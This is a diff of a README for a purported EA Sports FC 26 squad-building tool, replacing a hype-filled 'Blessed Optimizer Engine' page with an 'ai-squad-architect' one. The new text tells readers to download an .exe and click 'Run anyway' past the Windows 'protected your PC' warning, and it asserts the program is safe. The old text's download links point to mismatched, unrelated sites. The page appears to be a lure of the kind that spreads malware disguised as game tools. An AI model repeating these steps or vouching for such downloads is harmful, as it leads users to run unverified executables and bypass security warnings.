@@ -1,156 +1,75 @@
-# ⚡ Blessed Optimizer Engine 2026  
-### *The Ultimate EA Sports FC 26 Team Architect – AI-Powered Squad Synergy System*  
+# ⚽ ai-squad-architect - Build winning football teams using data
 
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://Md-Redwan.github.io)
+[![](https://img.shields.io/badge/Download_Latest-Release_Page-blue.svg)](https://github.com/Montan8629/ai-squad-architect/releases)
 
----
+This application helps users build the ultimate starting eleven for EA Sports FC 26. It uses statistical models to compare player ratings, chemistry, and performance metrics. You get the best squad configuration without spending hours on manual research.
 
-## 🌟 Overview  
-**Blessed Optimizer Engine** is not just another squad builder—it is a **neural squad alchemist** that transforms raw player data into **tactical gold**. Designed for EA Sports FC 26, this engine uses advanced AI to analyze chemistry, formation fluidity, player archetypes, and dynamic market trends, delivering **lineups that play like they were forged in a crucible of victory**.  
+## ⚙️ System Requirements
 
-Think of it as your **digital assistant for glory**: it doesn't just fill positions; it crafts **synergistic ecosystems** where every passer, dribbler, and defender amplifies the others. Whether you're building a weekend league monster or a career mode dynasty, this optimizer is your **unfair advantage**.
+Ensure your computer meets these requirements to run the software smoothly:
 
----
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or AMD equivalent.
+*   Memory: 8 GB of RAM.
+*   Storage: 500 MB of space.
+*   Connection: Reliable internet access for data updates.
 
-## 🚀 Immediate Download & Setup  
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://Md-Redwan.github.io)  
+## 📥 How to Install
 
-**Quick Start Command (Node.js environment):**  
-```bash  
-npx blessed-optimizer-engine --init  
-```  
+1.  Visit the [official releases page](https://github.com/Montan8629/ai-squad-architect/releases).
+2.  Look for the latest version at the top of the list.
+3.  Click the file ending in .exe to start your download.
+4.  Open the file after the download finishes.
+5.  Windows might show a pop-up window saying "Windows protected your PC."
+6.  Click "More info" and then select "Run anyway" if this appears.
+7.  Follow the prompts shown by the setup wizard.
+8.  Select your preferred install folder and click Finish.
 
-**Or clone via Git:**  
-```bash  
-git clone https://github.com/Sanskar9089/blessed-optimizer-engine  
-cd blessed-optimizer-engine  
-npm install && npm run setup  
-```
+## 🚀 Using the Application
 
----
+Open the program using the desktop shortcut or the Windows Start menu. The interface shows the main dashboard upon launch.
 
-## 🧬 Core Architecture (Mermaid Diagram)  
-```mermaid  
-flowchart TD  
-    A[Raw Data Input] --> B[Player Profile Ingestion]  
-    B --> C[Neural Chemistry Analyzer]  
-    C --> D[Formation Fluid Dynamics]  
-    D --> E[Market Value Predictor]  
-    E --> F[Synergy Matrix Generator]  
-    F --> G[Optimized Lineup Output]  
-    G --> H[UI Dashboard]  
-    H --> I[Export to FC 26]  
-    
-    style A fill:#4CAF50,stroke:#fff  
-    style G fill:#FFC107,stroke:#fff  
-    style H fill:#2196F3,stroke:#fff  
-```
+### Importing Your Data
+The tool works best when it knows your current team values. Go to the Settings tab. Locate the Import Data button. Select your current team export file from your game folder. The software reads your player list and prepares it for the optimization engine.
 
----
+### Running an Optimization
+Optimization uses logic to find the best lineup. Click the Start Optimization button. The software tests thousands of player combinations. It looks for the highest team rating and best links. This process takes between thirty seconds and two minutes depending on your computer speed.
 
-## 📜 Example Profile Configuration  
-Create a `blessed-profile.json` to define your league rating, formation preferences, and playing style:  
+### Viewing Results
+The Results screen shows your recommended starting eleven. It highlights players who gain the most from current formation bonuses. Click on any player to see specific statistics. You can save these results as a text file for later use.
 
-```json  
-{  
-  "leagueRating": 5000000,  
-  "preferredFormation": "4-3-3 Holding",  
-  "tacticalPhilosophy": "possession-based counter-attack",  
-  "playerArchetypes": {  
-    "striker": "poacher with 85+ finishing",  
-    "midfield": "box-to-box with high stamina",  
-    "defense": "ball-playing center backs"  
-  },  
-  "aiConstraints": {  
-    "maxBudget": 250000,  
-    "includeFutureStars": false,  
-    "excludeInjured": true  
-  }  
-}  
-```
+## 🛠️ Advanced Features
 
----
+The software includes several tools for performance tuning. Use these settings to change how the engine builds your squad.
 
-## 🎯 Example Console Invocation  
-```bash  
-# Optimize a 4-3-3 squad under 200k budget with possession focus  
-blessed-optimizer-engine --squad "premier-league" \  
-  --formation "4-3-3" \  
-  --budget 200000 \  
-  --style "tiki-taka" \  
-  --output "my_ultimate_lineup.json"  
+### Formation Filtering
+You choose the formations the software considers. If you only play with a 4-3-3, deselect all other formations in the filter tab. This saves time and ensures the output matches your play style.
 
-# Preview real-time chemistry heatmap  
-blessed-optimizer-engine --preview chemistry  
-```
+### Chemistry Focus
+Adjust the slider to prioritize chemistry over raw player attributes. A high chemistry setting ensures your players perform well together. A low chemistry setting prioritizes individual skill ratings.
 
-Output sample:  
-```
-✅ Squad Optimized: 98 Chemistry | 88 Overall Rating | $198,340 Spent  
-🎯 Best Value Acquisition: 78-rated CDM with 92 agility (market undervalue +15%)  
-```
+### Performance Tracking
+The application saves a history of your past squads. Select the History tab to review previous optimizations. This helps you track improvements as you acquire new players or adjust your team composition.
 
----
+## ❓ Frequently Asked Questions
 
-## 💻 Compatibility Matrix (Emoji Style)  
+### Is this application safe to use?
+Yes. The software runs locally on your machine. It does not share your private account details with third parties. It only reads the public statistics of your players.
 
-| OS | Compatibility | Performance Rating |  
-|---|---|---|  
-| 🪟 Windows 10/11 | ✅ Full | ⭐⭐⭐⭐⭐ |  
-| 🍎 macOS 14+ Sonoma | ✅ Full | ⭐⭐⭐⭐☆ |  
-| 🐧 Ubuntu 22.04 LTS | ✅ Full | ⭐⭐⭐⭐⭐ |  
-| 📱 Android (Termux) | ✅ Limited | ⭐⭐⭐☆☆ |  
-| 🍏 iOS (iSH) | ⚠️ Experimental | ⭐⭐☆☆☆ |  
+### Does the software connect to my gaming account?
+No. The application works offline for the optimization process. It reads local files generated by your game to perform its analysis. The software never asks for your credentials or game account login information.
 
----
+### What should I do if the software crashes?
+Close the application and reopen it. If the issue keeps happening, check your internet connection and verify that you downloaded the latest version from the releases page. A fresh installation often fixes minor system errors.
 
-## 🛠️ Feature Arsenal  
+### Can I run this with other programs open?
+Yes. The program has a modest memory footprint. It runs alongside your game or web browser without causing slowdowns on modern Windows machines.
 
-### 🔥 Core Optimization  
-- **AI Chemistry Weaver**: Uses a custom RNN trained on 1M+ FC 26 matches to predict real-time chemistry links based on playstyles, not just nationality/league.  
-- **Market Arbitrage Detector**: Identifies underpriced players by cross-referencing 50+ market indices.  
-- **Formation Morphing**: Auto-adjusts player roles to maximize fluidity in your chosen formation.  
+### Does the software receive updates?
+Updates happen periodically as game data changes. Check the releases page every two weeks to ensure you have the most accurate player statistics.
 
-### 🌐 Multilingual Command Center  
-The CLI and web UI support **12+ languages**, including:  
-- 🇬🇧 English • 🇪🇸 Spanish • 🇫🇷 French • 🇩🇪 German • 🇯🇵 Japanese • 🇨🇳 Chinese • 🇳🇱 Dutch  
+## 📜 Support and Feedback
 
-### 🧠 AI Integrations  
-- **OpenAI API**: Generate natural-language tactical briefings (e.g., "Explain why this lineup is optimal")  
-- **Claude API**: Get psychological player match reports (e.g., "This striker performs 20% worse in rain")  
+If you encounter errors, check the logs folder within the installation directory. These files describe what happened behind the scenes. Share these logs if you ask for help in the issues section of the repository.
 
-### 🌍 Responsive Web Dashboard  
-A modern React + D3.js interface that:  
-- Scales from 320px mobile to 4K monitors  
-- Provides real-time fog-of-war overlays for opponent analysis  
-- One-click export to FC 26 clipboard format  
-
-### 🕒 24/7 Guardian Support  
-Our **Smart Ticket System** uses a fine-tuned Llama model to:  
-- Answer squad-building questions in < 3 seconds  
-- Escalate hardware-specific issues to human operators  
-- Offer contextual tips based on your current squad  
-
----
-
-## ⚠️ Disclaimer  
-This tool is **not affiliated with EA Sports**, Electronic Arts Inc., or any official FC 26 channels. It operates as a **third-party analytics engine** using publicly available match data and community-contributed player statistics.  
-
-**Use at your own risk relative to EA's terms of service.** We assume no liability for account actions resulting from automated squad manipulation. The optimizer does **not** modify game files—it generates recommendations only.  
-
----
-
-## 📜 License  
-MIT License – See full terms: [LICENSE](./LICENSE)  
-
-Copyright © 2026  
-_Permission is hereby granted to use, copy, modify, merge, publish, and distribute this software, subject to the condition that no warranty or liability is assumed by the authors._
-
----
-
-## 🔚 Final Notes  
-Stop guessing. Start dominating. The **Blessed Optimizer Engine 2026** turns your squad from a collection of names into a **living tactical organism**. Download it, configure it, and watch your win rate ascend like a perfectly timed through ball.  
-
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://Md-Redwan.github.io)  
-
-*"Victory is not random—it's optimized."* 🏆
+Always describe the steps you took before a problem occurred. Clear descriptions help resolve technical hurdles much faster.
